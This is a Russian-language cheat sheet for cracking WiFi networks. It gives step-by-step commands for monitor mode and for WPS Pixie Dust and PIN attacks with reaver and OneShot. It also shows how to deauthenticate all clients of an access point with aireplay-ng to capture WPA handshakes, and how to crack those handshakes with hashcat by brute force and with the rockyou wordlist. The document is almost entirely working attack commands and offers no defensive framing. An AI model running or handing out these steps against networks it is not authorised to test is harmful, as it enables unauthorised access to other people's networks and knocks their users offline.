### Получение HandShake с помощью скриптов:
Перевод интерфейса в режим монитора. Аргументы -> device
```
./1_mon.sh wlan1
```
Получение списка доступных сетей. Аргументы -> device
```
./2_all_dump.sh wlan1
```
Ожидание рукопожатия. Аргументы -> device, channel, bssid, ssid
```
./3_dump.sh wlan1 7 00:11:22:33:44:55 SSID_NAME
```
Деаутентификация всех клиентов. Аргументы -> device, bssid
```
./4_kill.sh wlan1 00:11:22:33:44:55
```

### Перевод адаптера в режим монитора:
Показать wifi адаптеры
```
iw dev
```
Выключить интерфейс
```
ip link set wlan1 down
```
Перевод интерфейса в режим монитора
```
iw wlan1 set monitor control
```
Включить интерфейс
```
ip link set wlan1 up
```

### WPS 1 вариант:
Получение списка точек с включённым WPS
```
sudo wash -i wlan1
```
Мягкий режим (Pixie Dust)
```
sudo reaver -i wlan1 -b 00:11:22:33:44:55 -K -vv -L -N -d 15 -T .5 -r 3:15
```
Жёсткий режим, может вылететь таймаут (Pixie Dust)
```
sudo reaver -i wlan1 -b 00:11:22:33:44:55 -K
```
Подбор пароля при известном пине
```
sudo reaver -i wlan1 -b 00:11:22:33:44:55 -p 12345678
```

### WPS 2 вариант:
Получение списка точек с включённым WPS
```
sudo wash -i wlan1
```
Pixie Dust
```
sudo ./oneshot.py -i wlan1 -b 00:11:22:33:44:55 -K
```

### Получение HandShake:
Получение списка доступных сетей
```
sudo airodump-ng --manufacturer --uptime --wps wlan1
```
Ожидание рукопожатия и сохранение HandShake в файл POINT_NAME (без расширения)
```
sudo airodump-ng -c 7 --bssid 00:11:22:33:44:55 -w SSID_NAME wlan1
```
Деаутентификация всех клиентов точки
```
sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan1
```

### Расшифровка HandShake с помощью HashCat влоб:
Конверт файла
```
cap2hccapx.bin SSID_NAME-01.cap SSID_NAME.hccapx
```
Брутфорс 8 цифр
```
sudo hashcat -m 2500 -a 3 SSID_NAME.hccapx ?d?d?d?d?d?d?d?d
```
Брутфорс 8 букв
```
sudo hashcat -m 2500 -a 3 SSID_NAME.hccapx ?l?l?l?l?l?l?l?l
```

### Расшифровка HandShake с помощью HashCat по словарю:
Очистка словаря от лишних слов
```
cat rockyou.txt | sort | uniq | pw-inspector -m 8 -M 63 > newrockyou.txt
```
Подбор пароля по словарю
```
sudo hashcat --force --hwmon-temp-abort=100 -m 2500 -D 1,2 -a 0 SSID_NAME.hccapx newrockyou.txt
```

### Установки
```
sudo apt install -y python3 wpasupplicant iw wget git reaver pixiewps

git clone https://github.com/drygdryg/OneShot.git

git clone https://github.com/hashcat/hashcat-utils.git
cd src
sudo make
export PATH=$PATH:~/hashcat-utils/src

git clone https://github.com/hashcat/hashcat.git
sudo make
sudo make install

git clone git://git.kali.org/packages/wordlists.git
```
